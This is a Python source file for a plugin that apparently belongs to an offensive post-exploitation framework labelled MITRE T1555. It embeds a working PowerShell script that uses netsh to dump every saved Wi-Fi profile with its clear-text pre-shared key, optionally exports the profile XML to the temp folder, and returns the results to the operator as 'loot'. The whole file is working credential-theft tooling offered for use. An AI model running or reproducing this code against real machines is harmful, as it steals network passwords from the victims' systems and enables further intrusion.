"""credential_access/wifi_creds — Wi-Fi PSK dump via netsh + profile XML export. MITRE T1555"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class WifiCreds(BasePlugin):
    NAME        = "wifi_creds"
    DESCRIPTION = "Dump all Wi-Fi profiles with clear-text PSK via netsh. Includes SSID, auth type, PSK."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1555"
    CATEGORY    = "credential_access"
    schema      = ParamSchema().add(
        Param("export_xml", bool, required=False, default=False,
              help="Also export raw profile XML for each SSID"),
    )

    @mitre("T1555")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        export_xml = params.get("export_xml", False)

        ps = (
            "$profiles=netsh wlan show profiles 2>&1 |"
            "  Select-String 'All User Profile' |"
            "  ForEach-Object{($_ -split ':',2)[1].Trim()};"
            "if(-not $profiles){"
            "  Write-Output 'No Wi-Fi profiles found (no WLAN adapter or not connected?)';"
            "  return"
            "};"
            "$results=@();"
            "foreach($p in $profiles){"
            "  $detail=netsh wlan show profile name=$p key=clear 2>&1;"
            "  $auth  =($detail|Select-String 'Authentication'|Select-Object -First 1) -replace '.*:\\s*','';"
            "  $cipher=($detail|Select-String 'Cipher'|Select-Object -First 1) -replace '.*:\\s*','';"
            "  $psk   =($detail|Select-String 'Key Content'|Select-Object -First 1) -replace '.*:\\s*','';"
            "  $results+=[PSCustomObject]@{SSID=$p;Auth=$auth.Trim();Cipher=$cipher.Trim();PSK=$psk.Trim()}"
            "};"
            # Format as table
            "Write-Output '=== Wi-Fi Credentials ===';"
            "Write-Output ('{0,-32} {1,-20} {2,-12} {3}' -f 'SSID','Auth','Cipher','PSK');"
            "Write-Output ('-'*80);"
            "foreach($r in $results){"
            "  Write-Output ('{0,-32} {1,-20} {2,-12} {3}' -f $r.SSID,$r.Auth,$r.Cipher,$r.PSK)"
            "};"
            f"Write-Output \"`nTotal: $($results.Count) profiles\";"
        )

        if export_xml:
            ps += (
                "Write-Output '';"
                "Write-Output '=== Profile XML Export ===';"
                "foreach($p in $profiles){"
                "  $xml=netsh wlan export profile name=$p folder=$env:TEMP key=clear 2>&1;"
                "  $f=Get-ChildItem $env:TEMP -Filter \"$p.xml\" -EA SilentlyContinue|Select-Object -First 1;"
                "  if($f){Write-Output \"[XML] $($f.FullName):\"; Get-Content $f.FullName; Write-Output ''}"
                "};"
            )

        r = ctx.ps(ps)
        if r["status"] not in ("ok", "error"):
            return ModuleResult.err("Dispatch failed")
        return ModuleResult.ok(data=r["output"], loot_kind="wifi_creds")
